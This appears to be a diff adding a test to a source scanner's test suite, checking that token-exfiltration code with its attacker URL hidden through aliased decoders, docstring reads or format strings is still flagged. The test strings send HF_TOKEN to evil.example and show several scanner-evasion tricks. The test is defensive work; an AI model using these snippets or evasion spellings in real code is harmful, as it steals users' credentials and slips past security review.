@@ -3836,6 +3836,63 @@ def test_urllib_refuses_the_hub_allowance():
         ], body
 
 
+def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
+    """Three spellings the readable-name checks could not see, because the only
+    place the name appears is the import line.
+
+    `from base64 import b64decode as d` leaves the call as d(...), which the
+    qualified decoder pattern does not match; `from inspect import getdoc as g`
+    leaves g(fetch), which is neither a Name nor an Attribute the docstring
+    check reads; and "{p[s]}://{p[h]}".format(p = parts) spells its own scheme
+    out of a field, which the format fold declined to read at all rather than
+    leaving a hole in. Each one sent HF_TOKEN to an attacker host while an
+    unused hub literal granted the allowance. Upstream imports none of these
+    modules and builds no URL with .format, so refusing costs nothing there.
+    """
+    scan_converter_source = _load(
+        "converter_scan_import_alias_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    docstring = 'def fetch():\n    """https://evil.example/collect"""\n'
+    for body in (
+        'from base64 import b64decode as d\n' + hub
+        + 'url = d("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYw==").decode()\n' + send,
+        'import base64 as b\n' + hub
+        + 'url = b.b64decode("aHR0cHM6").decode()\n' + send,
+        'from binascii import unhexlify as h\n' + hub
+        + 'url = h("68747470733a").decode()\n' + send,
+        'from urllib.parse import unquote as u\n' + hub
+        + 'url = u("https%3A%2F%2Fevil.example%2Fc")\n' + send,
+        'from inspect import getdoc as g\n' + hub + docstring
+        + 'url = g(fetch)\n' + send,
+        'from pydoc import getdoc as g\n' + hub + docstring
+        + 'url = g(fetch)\n' + send,
+        'import inspect as i\n' + hub + docstring
+        + 'url = i.getdoc(fetch)\n' + send,
+        hub + 'parts = {"s": "https", "h": "evil.example"}\n'
+        + 'url = "{p[s]}://{p[h]}/c".format(p = parts)\n' + send,
+        # The same hidden scheme through a spec, which is never evaluated.
+        hub + 'url = "{0:s}://{1:s}/c".format(scheme, host)\n' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + body
+            )
+        ], body
+
+    # And what upstream actually does still passes: it imports none of those
+    # modules, and every "://" it writes is preceded by a readable scheme.
+    assert scan_converter_source(
+        'import os\nimport requests\nfrom urllib.parse import urlparse\n'
+        + hub
+        + 'assert urlparse(HUB).netloc\n'
+        + 'url = "{}/api/models".format(HUB)\n'
+        + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
